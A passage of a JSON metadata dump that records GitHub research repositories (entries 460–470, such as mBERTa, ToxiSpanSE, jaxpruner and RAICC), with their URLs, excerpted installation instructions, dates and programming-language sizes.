                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "_Repo_ **(java)**: https://github.com/Ahmedfir/java-business-locations.git \nIn this step we parse the input java classes and extract the main business-logic nodes to mutate.\nYou can either clone and build the code yourself or use our released standalone jar directly.\nIn https://github.com/Ahmedfir/CodeBERT-nt we incorporate the jar and call it directly from the python side, \nto extract the tokens.\n  \n",
                    "original_header": "AST parsing and location selection:"
                },
                "confidence": 0.9999517601583949,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Ahmedfir/mBERTa/master/Readme.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "_Repo_ **(python)**: https://github.com/Ahmedfir/cbnt \n_Repo_ **(python)**: https://github.com/Ahmedfir/CodeBERT-nt \n",
                    "original_header": "Masking and CodeBERT invocation:"
                },
                "confidence": 0.9992664061159129,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Ahmedfir/mBERTa/master/Readme.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "_Repo_ **(java)**: https://github.com/Ahmedfir/mbert-additive-patterns.git \n",
                    "original_header": "Condition seeding:"
                },
                "confidence": 0.9999542394240193,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Ahmedfir/mBERTa/master/Readme.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- The `eval` repo contains our code to run \u03bcBERT and PiTest on defects4j bugs.\n- To run the fault detection simulations we used:\n_Main repo_ **(python)**: \nhttps://github.com/Ahmedfir/mu-FD-simulation.git\n- To run our statistical tests we used:\nhttps://github.com/Ahmedfir/a12stats\n- Do not hesitate to contact as if you need any further support. \n",
                    "original_header": "Evaluation on Defects4J:"
                },
                "confidence": 0.9999990538810762,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Ahmedfir/mBERTa/master/Readme.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-10-27T15:50:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-20T02:06:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 152624
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2990
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1895
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "460": {
        "filename": "WSU-SEAL_ToxiSpanSE_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/WSU-SEAL/ToxiSpanSE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "$ pip install -r \"requirements.txt\"\n\nToxiSpanSE is user friendly tool. You can view all the options by using the following command:\n$ python ToxiSpanSE.py --h\n\n<p align=\"center\">\n  <img width=\"450\" height=\"250\" src=\"ToxiSpanSE_options.png\">\n</p>\n",
                    "type": "Text_excerpt",
                    "original_header": "install all the requirements: </br>"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/WSU-SEAL/ToxiSpanSE/main/README.md"
            },
            {
                "result": {
                    "value": "Most of the commands are written in run.sh file. You can run it by:\n$sh run.sh \n\nTo run the ToxiSpanSE model, you should put following:\n$python ToxiSpanSE.py\n\nThe above command will execute the best Model RoBERTa with varying the threshold value. \n\nTo run a specific model (i.e, BERT) and generate the metrics with different threshold (0.01 to 0.99) in validation set, use\n\n$python ToxiSpanSE.py --algo bert --tokenizer bert --vary\n\nTo run a model (best model is RoBERTa) with a specific threshold (best threshold=0.12), use the following command:\n$python ToxiSpanSE.py --algo roberta --tokenizer roberta --threshold 0.12\n\nTo print the misclassification, use the --retro argument. \n$python ToxiSpanSE.py --algo roberta --tokenizer roberta --threshold 0.12 --retro\n\nThe error classification file provides explainable toxicity prediction by tagging toxic words. Following is an example of predicted text:\nThis  looks  like  a  very   <toxic> ugly  hack </toxic> \n\n\nTo run the Naive Algorithm (lexicon-matching based), use:\n$python naive_algorithm.py\nThis naive algorithm uses 167 common toxic keywords from a list (/models/toxic_token_list.csv)\n\nTo calculate the Inter-Rater Agreement score 'krippendorff's alpha' use:\n$python krippendorff_alpha.py\n\nto aggregate the results from all thresholds in the validation set and find the optimal threshold using graph\n$python aggregate_results.py\n\n\nWe use a list of 240 tokens in /models/full_token_list.csv. We added these tokens to each pre-trained tokenizer. This list can be omitted. \nSometimes, pre-trained tokenizers split the words into subwords. After adding these tokens, tokenizers help to gain more explainability by making \ntoxic tagging understandable to users. \n\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Instructions in Details",
                    "parent_header": [
                        "install all the requirements: </br>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/WSU-SEAL/ToxiSpanSE/main/README.md"
            },
            {
                "result": {
                    "value": " Copyright Software Engineering Analytics Lab (SEAL), Wayne State University, 2023\n Authors: Jaydeb Sarker <jaydebsarker@wayne.edu> and Amiangshu Bosu <abosu@wayne.edu>\n\nThis program is free software; you can redistribute it and/or\nmodify it under the terms of the GNU General Public License\nversion 3 as published by the Free Software Foundation.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\nGNU General Public License for more details.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Copyright Information",
                    "parent_header": [
                        "install all the requirements: </br>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/WSU-SEAL/ToxiSpanSE/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-06-21T00:29:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-09-30T00:48:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 44066
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1144
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "461": {
        "filename": "adielashrov_Enhance-DL-with-SBM-Modelsward2023_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/adielashrov/Enhance-DL-with-SBM-Modelsward2023",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "PCC_SBM project was build on top of the https://github.com/PCCproject/PCC-RL project. \n",
                    "original_header": "PCC_SBM"
                },
                "confidence": 0.9908884225003505,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/adielashrov/Enhance-DL-with-SBM-Modelsward2023/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-08T06:42:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-07-07T14:33:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1090615
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 132544
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "ShaderLab",
                    "name": "ShaderLab",
                    "type": "Programming_language",
                    "size": 80492
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 26262
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 15829
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 14488
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HLSL",
                    "name": "HLSL",
                    "type": "Programming_language",
                    "size": 13994
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 13154
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 2655
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 2049
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 744
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "462": {
        "filename": "apwbs_MARTSIA_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/apwbs/MARTSIA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-09-28T10:45:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-15T11:10:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "463": {
        "filename": "hiroto-takatoshi_ProgLMBug_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hiroto-takatoshi/ProgLMBug",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "A research for programming language models' performance on bug detection\n[arXiv paper](https://arxiv.org/abs/1909.10309)\n- https://github.com/hiroto-takatoshi/atcoder_java\n- https://github.com/hiroto-takatoshi/XLM\n \n",
                    "original_header": "ProgLMBug"
                },
                "confidence": 0.9809809495003697,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hiroto-takatoshi/ProgLMBug/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-05-12T14:10:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-04-21T02:51:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 154943
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 15260
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "464": {
        "filename": "thomas-vogel_sapienzdiv-ssbse19_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/thomas-vogel/sapienzdiv-ssbse19",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "SAPIENZ<sup>div</sup> is installed and used similarly to [SAPIENZ](https://github.com/Rhapsod/sapienz).\nThe diversity-promoting mechanisms can be activated in the `settings.py` file.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation and Usage",
                    "parent_header": [
                        "SAPIENZ<sup>div</sup> @ SSBSE 2019"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/thomas-vogel/sapienzdiv-ssbse19/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-06-14T13:00:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-15T15:05:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 193046
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2266
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "465": {
        "filename": "google-research_jaxpruner_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/google-research/jaxpruner",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "You can install *JaxPruner* using pip directly from the source. \n\n```bash\npip3 install \n```\n\nAlternatively you can also clone the source and run tests using the run.sh script.\n\n```bash\ngit clone https://github.com/google-research/jaxpruner.git\ncd jaxpruner\n```\n\nFollowing script creates a virtual environment and installs the necessary libraries. Finally, it runs the tests.\n\n```bash\nbash run.sh\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "JaxPruner: a research library for sparsity research"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/google-research/jaxpruner/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-03-19T16:27:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-30T20:22:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 285430
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 239037
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1121
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "466": {
        "filename": "Trustworthy-Software_RAICC_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Trustworthy-Software/RAICC",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "<pre>\ncd RAICC\nmvn clean install:install-file -Dfile=libs/ic3-0.2.1-full.jar -DgroupId=edu.psu.cse.siis -DartifactId=ic3 -Dversion=0.2.1 -Dpackaging=jar\nmvn clean install:install-file -Dfile=libs/preprocessIntentSender-0.1.jar -DgroupId=lu.uni.trux -DartifactId=preprocessIntentSender -Dversion=0.1 -Dpackaging=jar\nmvn clean install\n</pre>\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing the tool",
                    "parent_header": [
                        "RAICC",
                        "Getting started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Trustworthy-Software/RAICC/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-01-12T13:05:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-22T05:41:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 108606
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 27881
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "467": {
        "filename": "shamimaaktar1_ChatGPT4SA_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/shamimaaktar1/ChatGPT4SA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n  <a href=\"https://www.youtube.com/embed/oYeH4Sgh_YU\">\n    <img src=\"https://user-images.githubusercontent.com/75358854/222472343-5e21f0fc-b41a-431a-87c2-56ee7349c84d.png\" alt=\"chatGPT logo\" width=\"200\" height=\"200\">\n  </a>\n</p> \n"
                },
                "confidence": 0.999812309409061,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/shamimaaktar1/ChatGPT4SA/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": " \n<p align=\"center\">\n    <a href=\"https://www.youtube.com/embed/oYeH4Sgh_YU\">\n   <img src=\"https://user-images.githubusercontent.com/75358854/222391866-9b18c78f-5db8-4b8e-b450-0ba631ed240e.png\" alt=\"Architecting with ChatGPT\" width=\"500\" height=\"600\">\n    </a>\n</p> \n\n## Experiment Replication Steps \n<p>\n Architectural analysis is managed by the architecture story provided to ChatGPT for articulating the Architecturally Significant Requirements (ASRs) via automatically produced and proposed requirements (by ChatGPT), the manual definition of the requirements (by the architect), or a continual conversation between ChatGPT and the architect to revise (add, delete, or update) the requirements.\n</p> \n",
                    "original_header": "Architecting Software-intensive Systems with ChatGPT"
                },
                "confidence": 0.9714008167292688,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/shamimaaktar1/ChatGPT4SA/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-16T12:41:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-04T11:15:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "468": {
        "filename": "softvis-research_Getaviz_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/softvis-research/Getaviz",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Clone this repository and have a look at our [Wiki](../../wiki) which contains many additional information. There you will find guides for installation, usage, and setting up your local environment for development. Please open an issue if you have any questions or experience any problems. Already answered questions can be found [here](https://github.com/softvis-research/Getaviz/labels/question).\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation, Usage, and Development",
                    "parent_header": [
                        "Getaviz"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/softvis-research/Getaviz/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-01-13T15:09:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-17T08:58:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 8571326
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Xtend",
                    "name": "Xtend",
                    "type": "Programming_language",
                    "size": 726926
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 582076
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Ruby",
                    "name": "Ruby",
                    "type": "Programming_language",
                    "size": 203873
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 119430
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 51958
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 20027
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PHP",
                    "name": "PHP",
                    "type": "Programming_language",
                    "size": 18335
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Cypher",
                    "name": "Cypher",
                    "type": "Programming_language",
                    "size": 11803
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SCSS",
                    "name": "SCSS",
                    "type": "Programming_language",
                    "size": 6636
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 6196
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CoffeeScript",
                    "name": "CoffeeScript",
                    "type": "Programming_language",
                    "size": 2215
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1057
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 97
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "469": {
        "filename": "jku-ssw_gcc-builtin-study_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/jku-ssw/gcc-builtin-study",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Some of the README Markdown files refer to an environment variable `$ARTIFACT_ROOT`. Please ensure that this environment variable is set. For example, you can set this variable for the current console by typing `export ARTIFACT_ROOT=path/to/the/artifact/root` on Linux.\n\nPlease also unpack the database file contained in the `database.zip` archive.\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/jku-ssw/gcc-builtin-study/master/INSTALLATION.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The database is stored in the [./database.db](./database.db) file. It is stored as a SQLite3 database, so that it can be easily distributed and shared. For convenience, we suggest to explore the database's content using [sqlitebrowser](https://sqlitebrowser.org/dl/), which is a GUI for SQLite3 databases and can be used on both Linux, Windows, and MacOS. Alternatively, the database can also be accessed on the command line by installing [SQLite3](https://www.sqlite.org/index.html) and typing `sqlite3 database.db`. The figure below shows an ER diagram created using [Dia](http://dia-installer.de/shapes/ER/index.html.en) with the most important entities and relations represented in the database. \n",
                    "original_header": "Database"
                },
                "confidence": 0.9992402170565315,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jku-ssw/gcc-builtin-study/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* For the script that fetches the projects, see the [./src/fetch_github_projects.py](./src/fetch_github_projects.py) script.\n* For the coverage score, see the [./coverage](./coverage) directory.\n* For how we filtered projects, see the definition of the `GithubProjectView` in [./database.db](./database.db).\n* For how we identified builtins from the documentation, see [./defs](./defs).\n* For how we identified builtins from the GCC source code, and how we identified builtin usages in the ~5,000 projects, see [./BuiltinAnalyzer](./BuiltinAnalyzer).\n* For how we excluded builtins, see [./src/sync-excludes.py](./src/sync-excludes.py).\n* For how we extracted builtin usages, see [./src/README.md](./src/README.md).\n \n",
                    "original_header": "Selecting the projects"
                },
                "confidence": 0.9996783676349377,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jku-ssw/gcc-builtin-study/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\n\u251c\u2500\u2500 LICENSE.md\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 STATUS.md\n\u251c\u2500\u2500 __pycache__\n\u251c\u2500\u2500 coverage\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 README.md\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 sampling_software_projects\n\u251c\u2500\u2500 defs\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 README.md\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 architecture-specific\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 internal\n\u251c\u2500\u2500 excludes\n\u251c\u2500\u2500 gcc-builtin-tests\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 README.md\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 tests\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 LICENSE.md\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 README.md\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 test-cases\n\u251c\u2500\u2500 generated\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 historical-data\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 csv\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 plots\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 pdf\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 png\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 latex\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 plots\n\u251c\u2500\u2500 paper\n\u251c\u2500\u2500 projects\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 FETCH_GITHUB_PROJECTS.md\n    \u251c\u2500\u2500 JavaProject\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 JAVA_PROJECTS.md\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 bin\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 lib\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 src\n    \u251c\u2500\u2500 __pycache__\n    \u251c\u2500\u2500 helper-gcc-doc-extraction\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 README.md\n    \u251c\u2500\u2500 include\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 __pycache__\n    \u251c\u2500\u2500 plots\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 README.md\n    \u2514\u2500\u2500 screenshots\n```\n \n",
                    "original_header": "Directory structure including all Markdown files"
                },
                "confidence": 0.9999999999582201,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jku-ssw/gcc-builtin-study/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-06-25T13:15:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-23T16:46:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 235137
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 78090
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 51554
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 16317
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 3929
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "470": {
        "filename": "Secure-Platforms-Lab-W-M_MASC-Artifact_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Secure-Platforms-Lab-W-M/MASC-Artifact",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Additionally, for all tools except Xanitizer v4.3.3, Coverity v2020.03, CodeQL (Codescanner and LGTM) (codeql-repo used is included for running the version of codeql queries we performed), and ShiftLeft v1.9.31 (due to their binaries and/or licenses not being provided), we have included a script, `tools_and_scripts/run_tools.sh`, to reproduce our results for all minimal flaws by running the command: \n\n```\nbash tools_and_scripts/run_tools.sh minimal_flaws\n``` \n**Note 1**: For Coverity, only the scripts for exhaustive and selective are included since all minimal Flaws were run via Coverity's GUI.\nHowever, the Coverity GUI configurations are included. \n",
                    "original_header": "tools_and_scripts"
                },
                "confidence": 0.9557942098652766,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Secure-Platforms-Lab-W-M/MASC-Artifact/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
